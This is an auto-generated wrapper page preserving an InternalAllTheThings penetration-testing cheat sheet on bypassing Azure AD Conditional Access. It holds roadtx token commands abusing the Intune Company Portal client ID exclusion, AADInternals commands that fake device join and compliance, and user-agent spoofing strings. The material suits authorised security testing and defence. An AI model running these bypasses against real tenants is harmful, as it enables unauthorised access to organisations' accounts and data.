---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure AD - Conditional Access Policy

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-ad-conditional-access-policy` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-ad-conditional-access-policy.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure AD - Conditional Access Policy](../../topics/cloud/azure-ad-conditional-access-policy.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-ad-conditional-access-policy |
| name | Azure AD - Conditional Access Policy |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-ad-conditional-access-policy.md |

## Preserved Source Material

````yaml
_body: "# Azure AD - Conditional Access Policy\n\nConditional Access is used to restrict access to resources to compliant\
  \ devices only.\n\n* [rbnroot/CAPSlock](https://github.com/rbnroot/CAPSlock) - Offline Conditional Access (CA) analysis\
  \ tool built on top of a roadrecon database.\n* [absolomb/FindMeAccess](https://github.com/absolomb/FindMeAccess) - Tool\
  \ for finding gaps in Azure/M365 MFA requirements for different resources, client ids, and user agents.\n\n## Enumerate\
  \ Conditional Access Policies\n\n* Enumerate Conditional Access Policies: `roadrecon plugin policies` (query the local database)\n\
  \n| CAP                       | Bypass  |\n|---------------------------|---------|\n| Location / IP ranges      | Corporate\
  \ VPN, Guest Wifi |\n| Platform requirement      | User-Agent switcher (Android, PS4, Linux, ...) |\n| Protocol requirement\
  \      | Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) |\n| Azure AD Joined Device    | Try to join a\
  \ VM (Work Access)|\n| Compliant Device (Intune) | Fake device compliance |\n| Device requirement        | / |\n| MFA  \
  \                     | / |\n| Legacy Protocols          | / |\n| Domain Joined             | / |\n\n```ps1\npython3 CAPSlock.py\
  \ analyze -u <userprincipalname> --resource <resource-id> [options]\npython3 CAPSlock.py what-if -u <userprincipalname>\
  \ --resource <resource-id> [options]\npython3 CAPSlock.py web-gui --port 8080\n```\n\n## Bypassing CAP by faking device\
  \ compliance\n\n### Intune Company Portal Client ID Bypass\n\nUse Intune Company Portal Client ID (`9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`),\
  \ to run `roadrecon` even when there is a device compliance policy. it is a hardcoded and undocumented exclusion in Conditional\
  \ Access for device compliance and has the `user_impersonation` rights on the AAD Graph.\n\n* Client ID: `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`\n\
  \n```ps1\nroadtx gettokens -u $username -p $password -r msgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223\
  \ # limite scope\nroadtx gettokens -u $username -p $password -r aadgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223\
  \ # user_impersonation scope\n```\n\n### AAD Internals - Making your device compliant\n\n```powershell\n# Get an access\
  \ token for AAD join and save to cache\nGet-AADIntAccessTokenForAADJoin -SaveToCache\n\n# Join the device to Azure AD\n\
  Join-AADIntDeviceToAzureAD -DeviceName \"SixByFour\" -DeviceType \"Commodore\" -OSVersion \"C64\"\n\n# Marking device compliant\
  \ - option 1: Registering device to Intune\n# Get an access token for Intune MDM and save to cache (prompts for credentials)\n\
  Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache \n\n# Join the device\
  \ to Intune\nJoin-AADIntDeviceToIntune -DeviceName \"SixByFour\"\n\n# Start the call back\nStart-AADIntDeviceIntuneCallback\
  \ -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \"SixByFour\"\n```\n\n## Bypassing CAP with device.trustType\n\
  \nThe trustType property is an internal attribute that defines the relationship between the device and Azure AD.\nWhen the\
  \ condition of CAP is `device.trustType -eq \"<TYPE>\"`, the values can be:\n\n* `AzureAD`: Azure AD joined devices\n* `Workplace`:\
  \ Azure AD registered devices\n* `ServerAD`: Hybrid joined devices\n\n## Bypassing CAP with user agent\n\nThere are several\
  \ devices you can use to authenticate and interact with a service.\nTry several `User-Agent` to get access to the resources:\n\
  \n* Windows: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\
  \ GLS/100.10.9939.100`\n* Linux: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0\
  \ Safari/537.36 uacq`\n* macOS: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)\
  \ Chrome/112.0.0.0 Safari/537.36 uacq`\n* Android: `Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko)\
  \ Chrome/109.0.5414.117 Mobile Safari/537.36`\n* iOS: `Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15\
  \ (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1`\n* WindowsPhone: `Mozilla/5.0 (Windows Phone 10.0;\
  \ Android 4.2.1; Microsoft; Lumia 650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36`\n\n## Bypassing\
  \ CAP with location\n\nTry different IP locations using a VPN.\n\n## References\n\n* [Conditional Access bypasses - Fabian\
  \ Bader - November 30, 2025](https://cloudbrothers.info/en/conditional-access-bypasses/)\n* [Finding Entra ID CA Bypasses\
  \ - the structured way - Dirk-jan Mollema and Fabian Bader - June 23, 2025](https://troopers.de/troopers25/talks/tfsfqs/)\n\
  * [STOP THE CAP: Making Entra ID Conditional Access Make Sense Offline - Lee Robinson - February 17, 2026](https://specterops.io/blog/2026/02/17/stop-the-cap-making-entra-id-conditional-access-make-sense-offline/)"
_relative_path: cloud/azure/azure-ad-conditional-access-policy.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-ad-conditional-access-policy.md
````
